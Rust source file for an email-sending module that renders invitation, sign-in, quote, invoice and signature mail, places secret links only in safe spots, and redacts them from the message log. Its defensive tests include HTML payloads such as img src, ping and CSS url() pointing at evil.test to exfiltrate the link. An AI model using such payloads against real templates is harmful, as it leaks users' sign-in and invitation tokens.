//! Turning queued mail jobs into messages, and recording what was sent.
//! The worker calls these around the actual send.
//!
//! Two kinds of mail job exist:
//!
//! - `mail.system`: platform mail made from an event (an invitation, a
//!   sign-in link). Its link travels encrypted in the job and is removed
//!   from the copy kept in the message log.
//! - `mail.send`: a rule's email, rendered from a workspace template against
//!   the context captured when the rule ran.

use core_db::jobs::Claimed;
use core_domain::{UserId, WorkspaceId};
use core_engines::templates::{Kind, Options, Rendered};
use core_integrations::mail::{Attachment, Email, MailError, Sent};
use serde_json::{Value, json};
use uuid::Uuid;

use super::{context, open_event_secret};
use crate::AppState;
use crate::error::{ApiError, ApiResult};

pub const SYSTEM_INVITATION: &str = "system.invitation";
pub const SYSTEM_MAGIC_LINK: &str = "system.magic_link";
pub const SYSTEM_QUOTE: &str = "system.quote";
pub const SYSTEM_INVOICE: &str = "system.invoice";
pub const SYSTEM_SIGNATURE: &str = "system.signature_request";

/// Event topics that become platform mail.
pub const SYSTEM_TOPICS: &[&str] = &[
    "invitation.created",
    "auth.magic_link_requested",
    "quote.sent",
    "invoice.sent",
    "document.signature_requested",
];

const INVOICE_SUBJECT: &str = "{% if invoice.kind == 'credit_note' %}Credit note{% else %}Invoice{% endif %} {{ invoice.reference }} from {{ workspace.name }}";
const INVOICE_BODY: &str = r#"<p>Hello,</p>
<p>Please find attached {% if invoice.kind == 'credit_note' %}credit note{% else %}invoice{% endif %} <strong>{{ invoice.reference }}</strong> from {{ workspace.name }}{% if invoice.booking_title %} for {{ invoice.booking_title }}{% endif %}.</p>
<p>Total: <strong>{{ invoice.total | money }}</strong>{% if invoice.due_date and invoice.kind != 'credit_note' %}, due {{ invoice.due_date | date }}{% endif %}.</p>
<p><a href="{{ invoice.url }}">View or download it online</a></p>"#;

const SIGNATURE_SUBJECT: &str = "Please sign: {{ document.title }}";
const SIGNATURE_BODY: &str = r#"<p>Hello {{ signer.name }},</p>
<p>{{ workspace.name }} has asked you to sign <strong>{{ document.title }}</strong>.</p>
<p><a href="{{ link.url }}">Read and sign it</a></p>
<p>The link is just for you, so please don't forward this email.</p>"#;

const QUOTE_SUBJECT: &str =
    "Quote {{ quote.reference }} from {{ workspace.name }}: {{ booking.title }}";
const QUOTE_BODY: &str = r#"<p>Hello,</p>
<p>{{ workspace.name }} has sent you a quote for <strong>{{ booking.title }}</strong>{% if booking.starts_at %} on {{ booking.starts_at | date(none, booking.timezone) }}{% endif %}{% if booking.venue %} at {{ booking.venue }}{% endif %}.</p>
{% if quote.message %}<p style="white-space:pre-line">{{ quote.message }}</p>{% endif %}
<p>Total: <strong>{{ quote.total | money }}</strong></p>
<p><a href="{{ quote.url }}">View and accept the quote</a></p>
{% if quote.valid_until %}<p>You can accept it until {{ quote.valid_until | date }}.</p>{% endif %}"#;

const INVITATION_SUBJECT: &str = "You're invited to {{ workspace.name }} on OnHold";
const INVITATION_BODY: &str = r#"<p>Hello,</p>
<p>You've been invited to join <strong>{{ workspace.name }}</strong> on OnHold as {{ invitation.role }}.</p>
<p><a href="{{ invitation.url }}">Accept the invitation</a></p>
<p>The link works until {{ invitation.expires_at | datetime }}. If you weren't expecting this, you can ignore it.</p>"#;

const MAGIC_LINK_SUBJECT: &str = "Your OnHold sign-in link";
const MAGIC_LINK_BODY: &str = r#"<p>Hi {{ user.name }},</p>
<p><a href="{{ link.url }}">Sign in to OnHold</a></p>
<p>The link works once, until {{ link.expires_at | datetime }}. If you didn't ask for it, ignore this email; your account is safe.</p>"#;

const REDACTED: &str = "[link removed]";

/// Stands in for a secret link while a workspace's own template renders. The
/// link is put in afterwards, and only where it stands on its own, so a
/// template can place the link but never reshape it or pass it elsewhere.
const LINK_PLACEHOLDER: &str = "OnHoldLinkPlaceholder";

/// A message ready to send, and what to record about it afterwards.
#[derive(Debug, Clone)]
pub struct Outgoing {
    pub email: Email,
    pub workspace: Option<WorkspaceId>,
    pub user: Option<UserId>,
    pub template_key: String,
    pub rule_id: Option<Uuid>,
    /// Secret links to remove from the stored copy.
    pub redact: Vec<String>,
}

/// Wraps a body in a plain, widely compatible HTML document unless it is one already.
pub fn layout(body: &str, footer: &str) -> String {
    if body.to_ascii_lowercase().contains("<html") {
        return body.to_owned();
    }
    format!(
        "<!doctype html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head>\
         <body style=\"margin:0;padding:24px;background:#f6f6f6;font-family:-apple-system,Segoe UI,Helvetica,Arial,sans-serif;color:#1a1a1a;line-height:1.5\">\
         <div style=\"max-width:600px;margin:0 auto;background:#ffffff;padding:24px;border-radius:6px\">{body}</div>\
         <p style=\"max-width:600px;margin:12px auto 0;font-size:12px;color:#777\">{footer}</p></body></html>",
        footer = html_escape(footer),
    )
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

fn message_id(state: &AppState, job_id: Uuid) -> String {
    let host = state
        .config
        .public_base_url
        .host_str()
        .unwrap_or("onhold.invalid");
    format!("<{job_id}@{host}>")
}

fn permanent(message: impl Into<String>) -> ApiError {
    ApiError::unprocessable("mail_not_sendable", message)
}

/// Builds the platform email for a `mail.system` job.
pub async fn prepare_system(state: &AppState, job: &Claimed) -> ApiResult<Outgoing> {
    let event_id: Uuid = job
        .payload
        .get("event_id")
        .and_then(Value::as_str)
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| permanent("job has no event id"))?;
    let topic = job
        .payload
        .get("topic")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let event = job.payload.get("event").cloned().unwrap_or(Value::Null);
    let sealed = job
        .secret
        .as_deref()
        .ok_or_else(|| permanent("the link is missing"))?;
    let secret = open_event_secret(&state.config.keyring, event_id, sealed)?;
    let url = secret
        .get("url")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned();

    match topic {
        "invitation.created" => {
            let ws = job
                .workspace_id
                .ok_or_else(|| permanent("invitation without a workspace"))?;
            let to = event
                .pointer("/after/email")
                .and_then(Value::as_str)
                .ok_or_else(|| permanent("invitation without an address"))?
                .to_owned();
            let mut tx = core_db::begin(&state.db, Some(ws), None).await?;
            let (workspace, options) = context::workspace(&mut tx, state).await?;
            let ctx_json = json!({
                "workspace": workspace,
                "invitation": {
                    "email": to,
                    "role": event.pointer("/after/role"),
                    "expires_at": event.pointer("/after/expires_at"),
                    "url": LINK_PLACEHOLDER,
                },
            });
            // A workspace may reword its invitation.
            let custom =
                core_db::templates::find(&mut tx, SYSTEM_INVITATION, &options.locale).await?;
            let rendered = match &custom {
                Some(t) => {
                    super::templates::render_in(
                        &mut tx,
                        Kind::Email,
                        t.subject.as_deref(),
                        &t.body,
                        &ctx_json,
                        &options,
                    )
                    .await?
                }
                None => {
                    super::templates::render_in(
                        &mut tx,
                        Kind::Email,
                        Some(INVITATION_SUBJECT),
                        INVITATION_BODY,
                        &ctx_json,
                        &options,
                    )
                    .await?
                }
            };
            let from_address = core_db::sender_domains::sending_address(&mut tx).await?;
            tx.commit().await?;
            let rendered = place_link(rendered, &url);
            let name = workspace
                .get("name")
                .and_then(Value::as_str)
                .unwrap_or("OnHold")
                .to_owned();
            let token = url::Url::parse(&url)
                .ok()
                .and_then(|u| {
                    u.query_pairs()
                        .find(|(k, _)| k == "token")
                        .map(|(_, v)| v.into_owned())
                })
                .unwrap_or_default();
            let mut out = outgoing(
                state,
                job.id,
                rendered,
                &to,
                Some(name.clone()),
                &format!("Sent by {name} via OnHold."),
                Some(ws),
                None,
                SYSTEM_INVITATION,
                None,
                vec![url, token],
            );
            out.email.from_address = from_address;
            Ok(out)
        }
        "auth.magic_link_requested" => {
            let user: Option<UserId> = event
                .get("user_id")
                .and_then(Value::as_str)
                .and_then(|s| s.parse().ok())
                .map(UserId);
            let to = event
                .get("email")
                .and_then(Value::as_str)
                .ok_or_else(|| permanent("sign-in link without an address"))?
                .to_owned();
            let ctx_json = json!({
                "user": { "name": event.get("name"), "email": to },
                "link": { "url": url, "expires_at": event.get("expires_at") },
            });
            let rendered = core_engines::templates::render(
                Kind::Email,
                Some(MAGIC_LINK_SUBJECT),
                MAGIC_LINK_BODY,
                Default::default(),
                &ctx_json,
                &Options::default(),
            )
            .map_err(|e| permanent(e.to_string()))?;
            Ok(outgoing(
                state,
                job.id,
                rendered,
                &to,
                None,
                "You asked to sign in to OnHold.",
                None,
                user,
                SYSTEM_MAGIC_LINK,
                None,
                vec![url],
            ))
        }
        "quote.sent" => {
            let ws = job
                .workspace_id
                .ok_or_else(|| permanent("quote without a workspace"))?;
            let to = event
                .pointer("/after/sent_to")
                .and_then(Value::as_str)
                .ok_or_else(|| permanent("quote without an address"))?
                .to_owned();
            let mut quote = event.get("after").cloned().unwrap_or(Value::Null);
            if let Some(q) = quote.as_object_mut() {
                q.insert("url".into(), Value::String(LINK_PLACEHOLDER.into()));
            }
            let mut tx = core_db::begin(&state.db, Some(ws), None).await?;
            let out = workspace_mail(
                state,
                &mut tx,
                job.id,
                ws,
                &to,
                SYSTEM_QUOTE,
                (QUOTE_SUBJECT, QUOTE_BODY),
                json!({ "quote": quote, "booking": event.get("booking") }),
                url,
            )
            .await?;
            tx.commit().await?;
            Ok(out)
        }
        "invoice.sent" => {
            let ws = job
                .workspace_id
                .ok_or_else(|| permanent("invoice without a workspace"))?;
            let to = event
                .pointer("/after/sent_to")
                .and_then(Value::as_str)
                .ok_or_else(|| permanent("invoice without an address"))?
                .to_owned();
            let id: Uuid = event
                .get("object_id")
                .and_then(Value::as_str)
                .and_then(|s| s.parse().ok())
                .ok_or_else(|| permanent("invoice without an id"))?;
            let mut invoice = event.get("after").cloned().unwrap_or(Value::Null);
            if let Some(i) = invoice.as_object_mut() {
                i.insert("url".into(), Value::String(LINK_PLACEHOLDER.into()));
            }
            let mut tx = core_db::begin(&state.db, Some(ws), None).await?;
            // The PDF as issued; still printing means try again shortly.
            let pdf = super::invoices::pdf_in(state, &mut tx, id).await?;
            let mut out = workspace_mail(
                state,
                &mut tx,
                job.id,
                ws,
                &to,
                SYSTEM_INVOICE,
                (INVOICE_SUBJECT, INVOICE_BODY),
                json!({ "invoice": invoice }),
                url,
            )
            .await?;
            tx.commit().await?;
            out.email.attachments.push(Attachment {
                filename: pdf.filename,
                content_type: pdf.content_type,
                bytes: pdf.bytes,
            });
            Ok(out)
        }
        "document.signature_requested" => {
            let ws = job
                .workspace_id
                .ok_or_else(|| permanent("signature request without a workspace"))?;
            let to = event
                .pointer("/signer/email")
                .and_then(Value::as_str)
                .ok_or_else(|| permanent("signature request without an address"))?
                .to_owned();
            let mut tx = core_db::begin(&state.db, Some(ws), None).await?;
            let out = workspace_mail(
                state,
                &mut tx,
                job.id,
                ws,
                &to,
                SYSTEM_SIGNATURE,
                (SIGNATURE_SUBJECT, SIGNATURE_BODY),
                json!({
                    "signer": event.get("signer"),
                    "document": event.get("document"),
                    "link": { "url": LINK_PLACEHOLDER },
                }),
                url,
            )
            .await?;
            tx.commit().await?;
            Ok(out)
        }
        other => Err(permanent(format!("no system mail for `{other}`"))),
    }
}

/// A workspace's own system email: its wording if it saved a template under
/// `key`, else the default, sent in its name. `extra` carries
/// [`LINK_PLACEHOLDER`] where the private `url` goes; the template never
/// sees the link itself, which is placed afterwards by [`place_link`].
#[allow(clippy::too_many_arguments)]
async fn workspace_mail(
    state: &AppState,
    tx: &mut core_db::Tx,
    job_id: Uuid,
    ws: WorkspaceId,
    to: &str,
    key: &str,
    default: (&str, &str),
    extra: Value,
    url: String,
) -> ApiResult<Outgoing> {
    let (workspace, options) = context::workspace(tx, state).await?;
    let mut ctx_json = extra;
    if let Some(o) = ctx_json.as_object_mut() {
        o.insert("workspace".into(), workspace.clone());
    }
    let custom = core_db::templates::find(tx, key, &options.locale).await?;
    let (subject, body) = match &custom {
        Some(t) => (t.subject.as_deref(), t.body.as_str()),
        None => (Some(default.0), default.1),
    };
    let rendered =
        super::templates::render_in(tx, Kind::Email, subject, body, &ctx_json, &options).await?;
    let rendered = place_link(rendered, &url);
    let name = workspace
        .get("name")
        .and_then(Value::as_str)
        .unwrap_or("OnHold")
        .to_owned();
    let mut out = outgoing(
        state,
        job_id,
        rendered,
        to,
        Some(name.clone()),
        &format!("Sent by {name} via OnHold."),
        Some(ws),
        None,
        key,
        None,
        vec![url],
    );
    out.email.from_address = core_db::sender_domains::sending_address(tx).await?;
    Ok(out)
}

/// Builds a rule's email for a `mail.send` job.
pub async fn prepare_rule_mail(state: &AppState, job: &Claimed) -> ApiResult<Outgoing> {
    let ws = job
        .workspace_id
        .ok_or_else(|| permanent("rule mail without a workspace"))?;
    let key = job
        .payload
        .get("template")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let to = job
        .payload
        .get("to")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned();
    if !core_engines::fields::is_email(&to) {
        return Err(permanent(format!("`{to}` is not an email address")));
    }
    let rule_id = job
        .payload
        .get("rule_id")
        .and_then(Value::as_str)
        .and_then(|s| s.parse().ok());
    let mut ctx_json = job
        .payload
        .get("context")
        .cloned()
        .unwrap_or_else(|| json!({}));

    let mut tx = core_db::begin(&state.db, Some(ws), None).await?;
    let (workspace, options) = context::workspace(&mut tx, state).await?;
    if let Some(obj) = ctx_json.as_object_mut() {
        obj.insert("workspace".into(), workspace.clone());
    }
    let template = core_db::templates::find(&mut tx, key, &options.locale)
        .await?
        .ok_or_else(|| permanent(format!("the template `{key}` no longer exists")))?;
    if template.kind != "email" {
        return Err(permanent(format!("`{key}` is not an email template")));
    }
    let rendered = super::templates::render_in(
        &mut tx,
        Kind::Email,
        template.subject.as_deref(),
        &template.body,
        &ctx_json,
        &options,
    )
    .await?;
    let from_address = core_db::sender_domains::sending_address(&mut tx).await?;
    tx.commit().await?;
    let name = workspace
        .get("name")
        .and_then(Value::as_str)
        .unwrap_or("OnHold")
        .to_owned();
    let mut out = outgoing(
        state,
        job.id,
        rendered,
        &to,
        Some(name.clone()),
        &format!("Sent by {name} via OnHold."),
        Some(ws),
        None,
        key,
        rule_id,
        vec![],
    );
    out.email.from_address = from_address;
    Ok(out)
}

#[allow(clippy::too_many_arguments)]
fn outgoing(
    state: &AppState,
    job_id: Uuid,
    rendered: Rendered,
    to: &str,
    from_name: Option<String>,
    footer: &str,
    workspace: Option<WorkspaceId>,
    user: Option<UserId>,
    template_key: &str,
    rule_id: Option<Uuid>,
    redact: Vec<String>,
) -> Outgoing {
    Outgoing {
        email: Email {
            to: to.to_owned(),
            from_name,
            from_address: None,
            reply_to: None,
            subject: rendered.subject.unwrap_or_default(),
            html: Some(layout(&rendered.body, footer)),
            text: rendered.text,
            message_id: message_id(state, job_id),
            attachments: Vec::new(),
        },
        workspace,
        user,
        template_key: template_key.to_owned(),
        rule_id,
        redact,
    }
}

/// Refuses wording for a system email that uses its private link anywhere
/// it would be removed when sent (added to, inside another address, in an
/// attribute other than a link's `href`), so the problem shows when the
/// template is saved rather than in a sent email.
pub(crate) async fn check_link_use(
    state: &AppState,
    tx: &mut core_db::Tx,
    key: &str,
    subject: Option<&str>,
    body: &str,
) -> ApiResult<()> {
    if ![
        SYSTEM_INVITATION,
        SYSTEM_QUOTE,
        SYSTEM_INVOICE,
        SYSTEM_SIGNATURE,
    ]
    .contains(&key)
    {
        return Ok(());
    }
    let (workspace, options) = context::workspace(tx, state).await?;
    let link = json!({ "url": LINK_PLACEHOLDER });
    let sample = json!({
        "workspace": workspace,
        "invitation": link,
        "quote": link,
        "invoice": link,
        "link": link,
    });
    let rendered =
        super::templates::render_in(tx, Kind::Email, subject, body, &sample, &options).await?;
    let placed = place_link(rendered, "https://example.test/link");
    let removed = |s: &str| s.contains(REDACTED);
    if placed.subject.as_deref().is_some_and(removed)
        || removed(&placed.body)
        || removed(&placed.text)
    {
        return Err(ApiError::invalid(
            "body",
            "use the link only on its own: as a link's whole address (href=\"{{ quote.url }}\") or \
             as a word in the text, never inside other text or another address",
        ));
    }
    Ok(())
}

/// Puts `link` where the template placed [`LINK_PLACEHOLDER`] on its own: as
/// the whole `href` of an `a` tag or as text (see [`link_spots`]). Anywhere
/// else (inside another address, say) it becomes [`REDACTED`].
fn place_link(rendered: Rendered, link: &str) -> Rendered {
    fn put(s: &str, link: &str, own: impl Fn(usize) -> bool) -> String {
        let mut out = String::with_capacity(s.len());
        let mut last = 0;
        for (i, _) in s.match_indices(LINK_PLACEHOLDER) {
            out.push_str(&s[last..i]);
            out.push_str(if own(i) { link } else { REDACTED });
            last = i + LINK_PLACEHOLDER.len();
        }
        out.push_str(&s[last..]);
        out
    }
    // Plain text: after a space, or after a bracket that follows one, so it
    // is never the tail of another address.
    fn word(s: &str, i: usize) -> bool {
        let mut before = s[..i].chars().rev();
        match before.next() {
            Some(c) if "([<".contains(c) => before.next().is_none_or(char::is_whitespace),
            c => c.is_none_or(char::is_whitespace),
        }
    }
    let spots = link_spots(&rendered.body);
    Rendered {
        subject: rendered.subject.map(|s| put(&s, link, |i| word(&s, i))),
        body: put(&rendered.body, &html_escape(link), |i| spots.contains(&i)),
        text: put(&rendered.text, link, |i| word(&rendered.text, i)),
    }
}

/// Where [`LINK_PLACEHOLDER`] stands on its own in `html`: in text outside
/// any tag, comment or raw-text element, or as the whole `href` of an `a`
/// start tag. Tags, quotes and comments are read by the HTML tokenizer's
/// rules, so a `>` or a stray quote inside an attribute cannot pass for text.
/// After a tag that changes how the rest is parsed (`script`, `svg`,
/// `select`...), nothing counts.
fn link_spots(html: &str) -> Vec<usize> {
    let b = html.as_bytes();
    let lower = html.to_ascii_lowercase();
    let find = |from: usize, pat: &str| html[from..].find(pat).map(|k| from + k);
    let mut spots = vec![];
    let mut i = 0;
    while i < b.len() {
        let lt = find(i, "<").unwrap_or(b.len());
        spots.extend(
            html[i..lt]
                .match_indices(LINK_PLACEHOLDER)
                .map(|(k, _)| i + k),
        );
        i = lt;
        let (next, after) = (b.get(i + 1).copied(), b.get(i + 2).copied());
        match next {
            None => break,
            Some(b'!') if html[i..].starts_with("<!--") => {
                // `<!-->` and `<!--->` close at once; `--!>` closes too.
                let ends = [
                    find(i + 2, "-->").map(|e| e + 3),
                    find(i + 4, "--!>").map(|e| e + 4),
                ];
                match ends.into_iter().flatten().min() {
                    Some(e) => i = e,
                    None => break,
                }
            }
            Some(b'/') if after == Some(b'>') => i += 3,
            Some(b'/') if after.is_some_and(|c| c.is_ascii_alphabetic()) => {
                match tag(b, &lower, i + 2) {
                    Some((end, _)) => i = end,
                    None => break,
                }
            }
            // Doctypes and bogus comments run to the next `>`.
            Some(b'!' | b'?' | b'/') => match find(i + 2, ">") {
                Some(e) => i = e + 1,
                None => break,
            },
            Some(c) if c.is_ascii_alphabetic() => {
                let name_end = (i + 1..b.len())
                    .find(|&p| is_space(b[p]) || b[p] == b'/' || b[p] == b'>')
                    .unwrap_or(b.len());
                let name = &lower[i + 1..name_end];
                let Some((end, attrs)) = tag(b, &lower, i + 1) else {
                    break;
                };
                i = end;
                let href = attrs.iter().find(|(n, _)| *n == "href");
                if name == "a"
                    && !attrs.iter().any(|(n, _)| *n == "ping")
                    && let Some((_, Some((s, e)))) = href
                    && &html[*s..*e] == LINK_PLACEHOLDER
                {
                    spots.push(*s);
                }
                match name {
                    "script" | "svg" | "math" | "plaintext" | "select" | "noscript"
                    | "frameset" => break,
                    "style" | "textarea" | "title" | "xmp" | "iframe" | "noembed" | "noframes" => {
                        // Raw text, up to the matching end tag.
                        let close = format!("</{name}");
                        let end = lower[i..]
                            .match_indices(&close)
                            .map(|(k, _)| i + k)
                            .find(|&k| {
                                b.get(k + close.len())
                                    .is_some_and(|&c| is_space(c) || c == b'/' || c == b'>')
                            });
                        match end {
                            Some(e) => i = e,
                            None => break,
                        }
                    }
                    _ => {}
                }
            }
            Some(_) => i += 1,
        }
    }
    spots
}

fn is_space(c: u8) -> bool {
    matches!(c, b'\t' | b'\n' | b'\x0c' | b'\r' | b' ')
}

type Attrs<'a> = Vec<(&'a str, Option<(usize, usize)>)>;

/// Reads a tag from its name at `p` to its `>`, as the HTML tokenizer does.
/// Returns the offset after the `>` and each attribute's lower-case name
/// with the range of its value, or `None` if the tag never closes.
fn tag<'a>(b: &[u8], lower: &'a str, mut p: usize) -> Option<(usize, Attrs<'a>)> {
    while p < b.len() && !is_space(b[p]) && b[p] != b'/' && b[p] != b'>' {
        p += 1;
    }
    let mut attrs = vec![];
    loop {
        while p < b.len() && (is_space(b[p]) || b[p] == b'/') {
            p += 1;
        }
        match b.get(p)? {
            b'>' => return Some((p + 1, attrs)),
            _ => {
                // The first character is part of the name even if it is `=`.
                let at = p;
                p += 1;
                while p < b.len() && !is_space(b[p]) && !matches!(b[p], b'/' | b'>' | b'=') {
                    p += 1;
                }
                let name = &lower[at..p];
                while p < b.len() && is_space(b[p]) {
                    p += 1;
                }
                if b.get(p) != Some(&b'=') {
                    attrs.push((name, None));
                    continue;
                }
                p += 1;
                while p < b.len() && is_space(b[p]) {
                    p += 1;
                }
                match *b.get(p)? {
                    q @ (b'"' | b'\'') => {
                        let k = b[p + 1..].iter().position(|&c| c == q)?;
                        attrs.push((name, Some((p + 1, p + 1 + k))));
                        p += k + 2;
                    }
                    b'>' => attrs.push((name, None)),
                    _ => {
                        let at = p;
                        while p < b.len() && !is_space(b[p]) && b[p] != b'>' {
                            p += 1;
                        }
                        attrs.push((name, Some((at, p))));
                    }
                }
            }
        }
    }
}

fn redact(text: &str, secrets: &[String]) -> String {
    secrets
        .iter()
        .filter(|s| !s.is_empty())
        .fold(text.to_owned(), |acc, s| {
            // The HTML copy escapes `&` in links, and templates escape `/` too.
            let amp = s.replace('&', "&amp;");
            acc.replace(s.as_str(), REDACTED)
                .replace(&amp, REDACTED)
                .replace(&amp.replace('/', "&#x2f;"), REDACTED)
        })
}

/// Stores the message as sent (or as failed for good), with secret links removed.
pub async fn record(
    state: &AppState,
    out: &Outgoing,
    job_id: Uuid,
    result: Result<&Sent, &MailError>,
) -> ApiResult<()> {
    let mut tx = core_db::begin(&state.db, out.workspace, out.user).await?;
    let html = out.email.html.as_deref().map(|h| redact(h, &out.redact));
    let text = redact(&out.email.text, &out.redact);
    let subject = redact(&out.email.subject, &out.redact);
    let (status, provider_id, error) = match result {
        Ok(sent) => ("sent", sent.provider_message_id.clone(), None),
        Err(e) => ("failed", None, Some(e.to_string())),
    };
    core_db::messages::insert(
        &mut tx,
        core_db::messages::NewMessage {
            workspace: out.workspace,
            user: out.user,
            to_address: &out.email.to,
            subject: Some(&subject),
            body_html: html.as_deref(),
            body_text: &text,
            template_key: Some(&out.template_key),
            rule_id: out.rule_id,
            job_id: Some(job_id),
            status,
            provider_message_id: provider_id.as_deref(),
            error: error.as_deref(),
        },
    )
    .await?;
    tx.commit().await?;
    Ok(())
}

pub async fn list(
    state: &AppState,
    ctx: &core_domain::Ctx,
    before: Option<Uuid>,
    limit: i64,
) -> ApiResult<Vec<core_db::messages::Message>> {
    ctx.authorize(core_domain::Permission::AuditRead)?;
    let mut tx = super::begin(state, ctx).await?;
    let rows = core_db::messages::list(&mut tx, before, limit.clamp(1, 200)).await?;
    tx.commit().await?;
    Ok(rows)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn redaction_covers_escaped_links() {
        let url = "https://app.test/accept?token=abc&x=1".to_owned();
        let html = format!("<a href=\"{}\">go</a> {url}", url.replace('&', "&amp;"));
        let out = redact(&html, &[url]);
        assert!(!out.contains("abc"), "{out}");
        assert_eq!(out.matches(REDACTED).count(), 2);
        let escaped = "<a href=\"https:&#x2f;&#x2f;app.test&#x2f;accept?token=abc&amp;x=1\">go</a>";
        assert!(
            !redact(
                escaped,
                &["https://app.test/accept?token=abc&x=1".to_owned()]
            )
            .contains("abc")
        );
    }

    #[test]
    fn links_are_only_placed_where_they_stand_alone() {
        let link = "https://app.test/accept?token=abc&x=1";
        let p = LINK_PLACEHOLDER;
        let out = place_link(
            Rendered {
                subject: Some(format!("Join: {p}")),
                body: format!(
                    "<a href=\"{p}\">go</a> <p>{p}</p> <img src=\"https://evil.test/?u={p}\"> <a href=\"https://evil.test/{p}\">x</a>"
                ),
                text: format!("go ({p}) or https://evil.test/?u={p}"),
            },
            link,
        );
        assert_eq!(
            out.subject.as_deref(),
            Some(format!("Join: {link}").as_str())
        );
        let escaped = "https://app.test/accept?token=abc&amp;x=1";
        assert_eq!(out.body.matches(escaped).count(), 2, "{}", out.body);
        assert_eq!(out.body.matches(REDACTED).count(), 2, "{}", out.body);
        assert_eq!(
            out.text,
            format!("go ({link}) or https://evil.test/?u={REDACTED}")
        );
    }

    #[test]
    fn links_never_land_inside_attributes_or_raw_text() {
        let p = LINK_PLACEHOLDER;
        let placed = |html: String| {
            let spots = link_spots(&html);
            html.match_indices(p)
                .map(|(i, _)| spots.contains(&i))
                .collect::<Vec<_>>()
        };
        // Allowed: text and an `a` tag's whole href, however it is quoted.
        assert_eq!(
            placed(format!(
                "{p}<p class=x>{p}</p><a href={p}>a</a><A title='>' HREF='{p}'>b</A>\
                 <!-- {p} -->{p}<!--->{p}<b>x</b >{p}"
            )),
            [true, true, true, true, false, true, true, true]
        );
        // Everything else, including where `>` or a quote only looks like
        // the end of a tag.
        for html in [
            format!("<img src=\"https://evil.test/?u=>{p}\">"),
            format!("<img src='https://evil.test/? href=\"{p}'>"),
            format!("<img alt=\"x\"src=https://evil.test/?{p}>"),
            format!("<a href=\"{p}\" ping=\"https://evil.test/\">x</a>"),
            format!("<a href=\"https://evil.test/{p}\">x</a><a title=\"{p}\">y</a>"),
            format!("<a href=\"{p}\""),
            format!("<!-- --!><img src=\"https://evil.test/?-->{p}\">"),
            format!("<style>@import url(\"https://evil.test/?<b>{p}\");</style >"),
            format!("<title></titlex><b>{p}</b>"),
            format!("<svg><style><![CDATA[</style>]]>a{{background:url({p})}}</style></svg>"),
            format!("<select><style><input><img src=\"https://evil.test/?</style>{p}\">"),
            format!("<noscript><img src=\"</noscript>{p}\"></noscript>"),
            format!("<script>{p}</script>{p}"),
        ] {
            assert!(placed(html.clone()).iter().all(|&ok| !ok), "{html}");
        }
        // Raw text ends at its own end tag; ordinary text follows.
        assert_eq!(
            placed(format!("<style>{p}</STYLE>{p}<textarea>{p}</textarea/>{p}")),
            [false, true, false, true]
        );
    }

    #[test]
    fn layout_wraps_fragments_only() {
        assert!(layout("<p>x</p>", "f").starts_with("<!doctype html>"));
        assert_eq!(
            layout("<html><body>x</body></html>", "f"),
            "<html><body>x</body></html>"
        );
        assert!(layout("<p>x</p>", "<b>").contains("&lt;b&gt;"));
    }
}
